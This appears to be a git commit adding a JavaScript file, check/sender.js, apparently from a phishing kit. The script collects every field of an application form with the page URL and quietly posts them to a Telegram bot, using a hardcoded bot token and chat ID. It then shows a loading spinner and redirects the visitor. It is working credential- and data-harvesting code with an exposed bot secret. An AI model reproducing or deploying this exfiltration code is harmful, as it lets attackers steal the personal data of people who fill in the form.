69301705993ac68d4468ae6409650e815ede5078
wingardj <155643779+wingardj@users.noreply.github.com>
2026-02-22 00:50:23 +0100

    Add files via upload

---
+++ check/sender.js
@@ -0,0 +1,86 @@
+function sendform(){
+  $('#loadr').show()
+    // let datatosend=JSON.stringify($('#application_form').formToJson());
+    
+
+    let datatosend=$('#application_form').serializeArray();
+
+    let message=''
+
+    for (let index = 0; index < datatosend.length; index++) {
+      const element = datatosend[index];
+
+      message += element.name + ": "+element.value+
+       "\r\n"+
+       "\r\n"
+
+    }
+
+
+    message+= "\r\n"+
+    "\r\n"+
+    document.URL
+
+
+    console.log('Data',datatosend)
+  
+    let chat_id, api
+    
+  
+      chat_id=6349530945;
+     
+  
+      api='6825286029:AAEAp5VERgZ2ZtmR6D7RyYLDWdKIyYJovDo';
+    
+    
+          // following ones are optional, so could be set as null
+          let disable_web_page_preview = null;
+          let reply_to_message_id = null;
+          let reply_markup = null;
+    
+     
+  
+          let datathree={
+            'chat_id':chat_id,
+            'text':message,
+            'disable_web_page_preview':disable_web_page_preview,
+            'reply_to_message_id':reply_to_message_id,
+            'reply_markup':reply_markup
+          }
+          
+  
+          let durl = 'https://api.telegram.org/bot'+api+'/sendMessage';
+  
+  
+    
+    let counter=0
+    
+    $.ajax({
+    url: durl,
+    type: 'POST',
+    data: datathree,
+    cache: false,
+    success:function(resp){
+     
+    },
+    error: function(data){
+     
+    }
+    });
+  
+    
+    // Wait for 3 seconds
+    setTimeout(function () {
+        // Hide the 'loadr' element
+        $('#loadr').hide();
+    
+        // Check the counter value
+        if (counter === 0) {
+            var pageFilename = './link';
+            // Redirect to the specified HTML page
+            window.location.href = pageFilename;
+        }
+    }, 12000);
+    
+    }
+
